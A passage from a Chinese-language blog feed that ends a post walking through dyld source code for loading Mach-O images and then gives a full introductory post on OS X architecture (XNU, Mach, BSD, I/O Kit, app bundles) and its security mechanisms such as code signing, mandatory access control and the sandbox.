segments</span></span><br><span class="line">			<span class="keyword">if</span> ( segCmd-&gt;vmsize != <span class="number">0</span> ) &#123;</span><br><span class="line">				<span class="comment">// record offset of load command</span></span><br><span class="line">				segOffsets[segIndex++] = (<span class="keyword">uint32_t</span>)((<span class="keyword">uint8_t</span>*)segCmd - fMachOData);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cmd = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd)+cmd-&gt;cmdsize);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里也没有什么复杂的代码了，就是根据<code>mach-o</code>文件<code>segments</code>的规则将数据加载到内存中。</p>
<p>这边返回之后就剩下调用<code>addimage</code>函数了。</p>
<h3 id="1-2-7_addimage">1.2.7 addimage</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addImage</span><span class="params">(ImageLoader* image)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">// add to master list</span></span><br><span class="line">	<span class="comment">// 对所有images的容器原子添加image</span></span><br><span class="line">    allImagesLock();</span><br><span class="line">        sAllImages.push_back(image);</span><br><span class="line">    allImagesUnlock();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// update mapped ranges</span></span><br><span class="line">	<span class="comment">// 更新内存分布的数据</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> lastSegStart = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> lastSegEnd = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>, e=image-&gt;segmentCount(); i &lt; e; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( image-&gt;segUnaccessible(i) ) </span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">uintptr_t</span> start = image-&gt;segActualLoadAddress(i);</span><br><span class="line">		<span class="keyword">uintptr_t</span> end = image-&gt;segActualEndAddress(i);</span><br><span class="line">		<span class="keyword">if</span> ( start == lastSegEnd ) &#123;</span><br><span class="line">			<span class="comment">// two segments are contiguous, just record combined segments</span></span><br><span class="line">			lastSegEnd = end;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// non-contiguous segments, record last (if any)</span></span><br><span class="line">			<span class="keyword">if</span> ( lastSegEnd != <span class="number">0</span> )</span><br><span class="line">				addMappedRange(image, lastSegStart, lastSegEnd);</span><br><span class="line">			lastSegStart = start;</span><br><span class="line">			lastSegEnd = end;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( lastSegEnd != <span class="number">0</span> )</span><br><span class="line">		addMappedRange(image, lastSegStart, lastSegEnd);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( sEnv.DYLD_PRINT_LIBRARIES || (sEnv.DYLD_PRINT_LIBRARIES_POST_LAUNCH &amp;&amp; (sMainExecutable!=<span class="literal">NULL</span>) &amp;&amp; sMainExecutable-&gt;isLinked()) ) &#123;</span><br><span class="line">		dyld::<span class="built_in">log</span>(<span class="string">"dyld: loaded: %s\n"</span>, image-&gt;getPath());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>addimage也只是做了一些数据更新</p>
<ul>
<li>将image添加到管理容器中</li>
<li>更新了内存分布的信息</li>
</ul>
<h1 id="0x02_小结">0x02 小结</h1><p>整个加载过程基本分为三个部分</p>
<ul>
<li>数据合法检测</li>
<li>根据mach-o文件的头部信息,将segments的具体信息构建到image的实例中</li>
<li>添加image到管理容器</li>
</ul>
<p>重要的几个函数如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/Calls-instantiateFromLoadedImage.png" alt="重要函数"></p>
<p>​    </p>
<p>那么mach-o文件的加载流程更多的细节就需要通过分析xnu内核了。</p>
<h1 id="reference">reference</h1><p>1.对dyld的分析(源码.代码签名等) </p>
<p><a href="http://cocoahuke.com/2016/02/14/dyld%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/" target="_blank" rel="external">http://cocoahuke.com/2016/02/14/dyld%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/</a></p>
<p>2.mach-o文件加载的全过程(1)</p>
<p><a href="http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/" target="_blank" rel="external">http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/</a></p>
<p>PS：</p>
<p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/找到，希望可以多多交流，不足之处还希望大家可以给与指正：）" target="_blank" rel="external">http://BLOGIMAGE/找到，希望可以多多交流，不足之处还希望大家可以给与指正：）</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>[TOC]</p>
<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p> Les commencements ont des charmes inexprimables.<br> 万物初始，美妙不可名状。</p>
</blockquote>
<p>通过阅读dyld源码，简单的分析macho在dyld中是如何被加载到内存中的。</p>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OS X 内核研究 准备知识]]></title>
    <link href="http://turingh.github.io/2016/02/29/OS-X-%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://turingh.github.io/2016/02/29/OS-X-内核研究-基础知识/</id>
    <published>2016-02-29T22:20:48.000Z</published>
    <updated>2016-03-24T03:37:43.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p>子贡问为仁。子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”<br>—《论语·卫灵公》</p>
</blockquote>
<p>​    在开始研究OSX内核以及与OSX相关知识之前，需要对OSX有一个比较全面的认识，将一些简单的概念搞清楚。</p>
<a id="more"></a>
<h1 id="0x01_OS_X_体系结构">0x01 OS X 体系结构</h1><p>​    </p>
<h2 id="1-1_OS_X系统的整体体系结构">1.1    OS X系统的整体体系结构</h2><ul>
<li>用户体验(                                                                                The User Experience layer                                    )：为了研究内核做准备，赞不关心。</li>
<li>应用软件开发框架（The Application Frameworks layer）：Cocoa, Carbon, Java这些开发的API与运行时。</li>
<li>核心开发框架（The Core Frameworks）：图形和多媒体一类软件的开发环境。</li>
<li>Darwin：系统内核。</li>
</ul>
<p>google了其他一些文章，分层也是基本差不多，可以参考此图：</p>
<p><img src="http://img.blog.163.com/photo/1JwDZEzqv4v1GGBEwOxUMg==/2605895334387332224.jpg" alt="os x 系统整体结构"></p>
<h2 id="1-2_Darwin体系结构">1.2 Darwin体系结构</h2><p>主要关心的其实还是Darwin这个模块，他的体系结构大致如下图所示:</p>
<p><img src="http://1.bp.blogspot.com/-aOeN0GyAGWQ/VIUPXg1fRVI/AAAAAAAAGzY/nYZrfMz4b7o/s1600/Screen%2BShot%2B2014-12-08%2Bat%2B8.06.57%2Bam.png" alt="Darwin"></p>
<p>这个图暂时看不懂也没关系，需要做到的知识储备有以下几点：</p>
<ul>
<li>Darwin是苹果系统的<strong>一部分</strong>。</li>
<li>Darwin是一种类似unix的操作系统，他的<strong>核心</strong>是XNU。</li>
<li>XNU是一种混合式内核。结合了<strong>mach</strong>与<strong>BSD</strong>两种内核。</li>
</ul>
<h2 id="1-3_XNU的简单概括">1.3 XNU的简单概括</h2><p>有以下4个主要的功能模块：</p>
<ul>
<li><p>Mach微内核</p>
</li>
<li><p>BSD内核</p>
</li>
<li><p>libKern</p>
</li>
<li><p>I/O Kit</p>
</li>
</ul>
<h3 id="1-3-1_Mach微内核简介">1.3.1 Mach微内核简介</h3><p>​    </p>
<p>Mach是作为传统<a href="https://zh.wikipedia.org/wiki/UNIX" target="_blank" rel="external">UNIX</a>内核的替代品出现的，因此其间的不同之处值得留意。当时的人们已渐渐感受到了早期UNIX中“一切皆文件”的抽象机制的不足，有限的扩展性使得开发者捉襟掣肘，苦不堪言。虽说贝尔实验室的<a href="https://zh.wikipedia.org/w/index.php?title=Plan9&amp;action=edit&amp;redlink=1" target="_blank" rel="external">Plan9</a>在此方向上做了进一步努力，可是效果并不理想。现代操作系统需要更进一步的抽象[1]。</p>
<p>在XNU中主要完成以下几个功能：</p>
<ul>
<li>进程与线程的抽象</li>
<li>虚拟内存管理</li>
<li>任务调度</li>
<li>进程间通信</li>
</ul>
<h3 id="1-3-2_BSD内核简介">1.3.2 BSD内核简介</h3><p>BSD的实现在Mach的上层，这一层提供了一些流行的API，支持了<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="external">POSIX</a>。在XNU中主要实现了一些高级的API与模块。</p>
<ul>
<li>UNIX进程模型</li>
<li>POSIX线程模型即pthread。以及相关的同步功能。</li>
<li>UNIX的用户与组管理</li>
<li>网络栈(BSD Socket API)</li>
<li>文件系统</li>
<li>设备系统</li>
</ul>
<h3 id="1-3-3_libKern">1.3.3 libKern</h3><p>libKern实现了一个C++的子集，为I/O kit 提供C++的实现。</p>
<h3 id="1-3-4_I/O_kit">1.3.4 I/O kit</h3><p>I/O Kit 是XNU不同于其他传统系统的设备驱动框架。</p>
<p>IOKit是一个面向对象的驱动模型框架，它是早期DriverKit的一个翻版，Driver Kit是使用Objective-C写的，而IOKit是一个C++的驱动架构，它在DriverKit的基础上做了很大的改进，比如IOKit可以写在用户空间跑的驱动（虽然大多仍是跑在内核空间上的），因而驱动挂了而系统不会挂。另外IOKit考虑到了计算机发展的趋势，所以在电源管理、即插即用、动态加载上做得更好[2]。</p>
<h2 id="1-4_APPs的文件结构">1.4 APPs的文件结构</h2><p>每一个应用程序都是这样一个大致类似的文件结构。</p>
<p><img src="http://www.monobjc.net/assets/screenshots/Bundle_Managed.png" alt="bundle"></p>
<h3 id="1-4-1_Info-plist">1.4.1 <strong>Info.plist</strong></h3><p> 为了提供更好的用户体验，IOS 和 OS X的每个app或bundle都依赖于特殊的元信息(meta Information).</p>
<ul>
<li>直接向用户展示信息</li>
<li>系统内部用来标识你的app或其支持的文档类型</li>
<li><p>系统框架用来辅助app的加载</p>
<p>每个application都使用Info.plist文件来存储以上的元信息，从名称上也可以判断出Info.plist就是以上提到的“属性列表”[3]。</p>
</li>
</ul>
<h3 id="1-4-2_Resources">1.4.2 Resources</h3><p>就是APP需要的资源。与我们研究内容关系不大不多关注。</p>
<h3 id="1-4-3_MacOS">1.4.3 MacOS</h3><p>这里存放的就是<strong>可执行文件</strong>。</p>
<h1 id="0x02_OS_X使用的安全机制">0x02 OS X使用的安全机制</h1><h2 id="2-1_代码签名">2.1 代码签名</h2><p><strong>肤浅的理解就是确认APP是通过了苹果审核的，可以认为是没有恶意的。</strong></p>
<p>摘录了一段比较详细的描述：</p>
<blockquote>
<p>作为一个 iOS 开发者，在你开发使用的机器上应该已经有一个证书，一个公钥，以及一个私钥。这些是代码签名机制的核心。像 SSL 一样，代码签名也依赖于采用 X.509 标准的公开密钥加密。</p>
<p>在 OS X 上一个应用是否允许被开启是由 Gatekeeper 的选项决定的，你可以在系统设置的安全选项中改变选项。在 Gatekeeper 选项中选择 “受信任的开发者或者来自 Mac App Store” 会要求被打开的应用必须被证书签名，可以是 Mac App Store 开发者的应用发布证书也可以是开发者 ID 证书。这些选项是由一个系统工具 spctl 来管理的，它管理着系统的所有安全评估策略。</p>
<p>在 iOS 上规则是不一样的，无论是用户还是开发者都不能改变应用开启策略，你必须有一个开发者帐号或者应用发布证书才能让应用运行在 iOS 系统上[4]。</p>
</blockquote>
<h2 id="2-2_强制访问控制_(Mandatory_Access_Control)">2.2 强制访问控制 (Mandatory Access Control)</h2><p>FreeBSD 5.x最早引入，是OS X<code>隔离机制（Sandboxing，沙盒机制）</code>和iOS的<code>entitlement机制</code>基础。</p>
<blockquote>
<p>强制访问控制（Mandatory Access Control——MAC），用于将系统中的信息分密级和类进行管理，以保证每个用户只能访问到那些被标明可以由他访问的信息的一种访问约束机制。通俗的来说，在强制访问控制下，用户（或其他主体）与文件（或其他客体）都被标记了固定的安全属性（如安全级、访问权限等），在每次访问发生时，系统检测安全属性以便确定一个用户是否有权访问该文件。</p>
</blockquote>
<h2 id="2-3_沙盒（sandbox）">2.3 沙盒（sandbox）</h2><p>沙盒是一种安全机制，为运行中的程序提供了一个隔离的环境。OS X的沙盒在启动的时候可以设置运行的程序是否可以访问网络、文件、目录等。</p>
<p><img src="http://blog.okeyang.com/images/2015/sandbox_architecture.png" alt="sandbox">图片摘自<a href="http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/" target="_blank" rel="external">这里</a>[5]。</p>
<h1 id="参考">参考</h1><p>[1].Mach — <a href="https://zh.wikipedia.org/wiki/Mach" target="_blank" rel="external">https://zh.wikipedia.org/wiki/Mach</a></p>
<p>[2].OSX系统编程环境的介绍 — <a href="http://www.tanhao.me/talk/440.html/" target="_blank" rel="external">http://www.tanhao.me/talk/440.html/</a></p>
<p>[3].IOS之Info.plist文件简介 — <a href="http://my.oschina.net/hmj/blog/104196" target="_blank" rel="external">http://my.oschina.net/hmj/blog/104196</a></p>
<p>[4]代码签名探析 — <a href="http://http://objccn.io/issue-17-2/" target="_blank" rel="external">http://http://objccn.io/issue-17-2/</a></p>
<p>[5]《深入解析Mac OS X &amp; iOS操作系统》读书笔记 —<a href="http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/" target="_blank" rel="external">http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/</a></p>
<p>  ​</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p>子贡问为仁。子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”<br>—《论语·卫灵公》</p>
</blockquote>
<p>​    在开始研究OSX内核以及与OSX相关知识之前，需要对OSX有一个比较全面的认识，将一些简单的概念搞清楚。</p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
</feed>
